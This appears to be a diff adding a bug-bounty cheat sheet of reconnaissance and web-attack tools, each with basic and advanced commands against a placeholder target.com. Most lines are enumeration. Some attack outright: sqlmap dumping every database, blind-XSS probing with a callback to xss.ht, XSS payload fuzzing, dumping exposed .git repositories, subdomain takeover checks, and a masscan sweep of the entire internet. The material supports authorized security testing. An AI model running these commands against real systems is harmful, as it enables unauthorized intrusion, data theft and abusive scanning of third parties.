@@ -1,0 +1,157 @@
+🛠️ Core Tools
+subfinder
+
+Basic: subfinder -d target.com
+
+Advanced: subfinder -d target.com -all -recursive -o subs.txt
+
+assetfinder
+
+Basic: assetfinder target.com
+
+Advanced: assetfinder --subs-only target.com | tee assets.txt
+
+amass
+
+Basic: amass enum -d target.com
+
+Advanced: amass enum -brute -d target.com -o amass.txt
+
+httpx
+
+Basic: httpx -l subs.txt
+
+Advanced: httpx -l subs.txt -title -status-code -tech-detect -o httpx.txt
+
+dnsx
+
+Basic: dnsx -l subs.txt -resp
+
+Advanced: dnsx -l subs.txt -a -aaaa -cname -mx -ns -o dnsx.txt
+
+waybackurls
+
+Basic: echo target.com | waybackurls
+
+Advanced: cat subs.txt | waybackurls | tee wayback.txt
+
+gau
+
+Basic: gau target.com
+
+Advanced: gau target.com --threads 50 --o gau.txt
+
+gf
+
+Basic: cat urls.txt | gf xss
+
+Advanced: cat urls.txt | gf sqli | tee sqli.txt
+
+dalfox
+
+Basic: dalfox url "http://target.com/?q=param"
+
+Advanced: dalfox file urls.txt --blind "https://xss.ht" -o dalfox.txt
+
+sqlmap
+
+Basic: sqlmap -u "http://target.com/page.php?id=1"
+
+Advanced: sqlmap -u "http://target.com/page.php?id=1" --risk=3 --level=5 --dump-all
+
+nuclei
+
+Basic: nuclei -u http://target.com
+
+Advanced: nuclei -l subs.txt -t cves/ -severity critical,high -o nuclei.txt
+
+dirsearch
+
+Basic: python3 dirsearch.py -u http://target.com -e php,html
+
+Advanced: python3 dirsearch.py -u http://target.com -w SecLists/Discovery/Web-Content/common.txt -x 403
+
+httprobe
+
+Basic: cat subs.txt | httprobe
+
+Advanced: cat subs.txt | httprobe -p http:81 -p https:8443 | tee live.txt
+
+git-dumper
+
+Basic: python3 git-dumper.py http://target.com/.git/ ./dump
+
+Advanced: python3 git-dumper.py http://target.com/.git/ ./dump --threads 20
+
+subjack
+
+Basic: subjack -w subs.txt -t 100 -timeout 30 -o takeover.txt
+
+Advanced: subjack -w subs.txt -ssl -c fingerprints.json -v -o takeover.txt
+
+kxss
+
+Basic: cat urls.txt | kxss
+
+Advanced: cat urls.txt | kxss | grep "param=" | tee kxss.txt
+
+qsreplace
+
+Basic: cat urls.txt | qsreplace "FUZZ"
+
+Advanced: cat urls.txt | qsreplace "javascript:alert(1)" | tee fuzz.txt
+
+🔧 Extended Tools
+SecLists
+
+Basic: cat SecLists/Discovery/Web-Content/common.txt
+
+Advanced: wfuzz -c -w SecLists/Fuzzing/XSS/xss.txt -u http://target.com/?q=FUZZ
+
+Gobuster
+
+Basic: gobuster dir -u http://target.com -w SecLists/Discovery/Web-Content/common.txt
+
+Advanced: gobuster dns -d target.com -w SecLists/Discovery/DNS/subdomains-top1million.txt
+
+Naabu
+
+Basic: naabu -host target.com
+
+Advanced: naabu -list subs.txt -rate 10000 -o naabu.txt
+
+MassDNS
+
+Basic: massdns -r resolvers.txt -t A -o S -w results.txt domains.txt
+
+Advanced: massdns -r resolvers.txt -t ANY -o J -w massdns.json domains.txt
+
+DNSenum
+
+Basic: dnsenum target.com
+
+Advanced: dnsenum --enum -f SecLists/Discovery/DNS/subdomains-top1million.txt target.com
+
+Masscan
+
+Basic: masscan -p80,443 target.com --rate=1000
+
+Advanced: masscan 0.0.0.0/0 -p1-65535 --rate=100000 -oX masscan.xml
+
+Rustscan
+
+Basic: rustscan -a target.com
+
+Advanced: rustscan -a target.com --ulimit 5000 -- -A -oN rustscan.txt
+
+Gotator
+
+Basic: gotator -sub subs.txt -perm perms.txt -depth 2 -adv
+
+Advanced: gotator -sub subs.txt -perm perms.txt -depth 3 -adv -silent | tee gotator.txt
+
+PureDNS
+
+Basic: puredns resolve subs.txt -r resolvers.txt -w resolved.txt
+
+Advanced: puredns bruteforce SecLists/Discovery/DNS/dns-Jhaddix.txt target.com -r resolvers.txt -w brute.txt
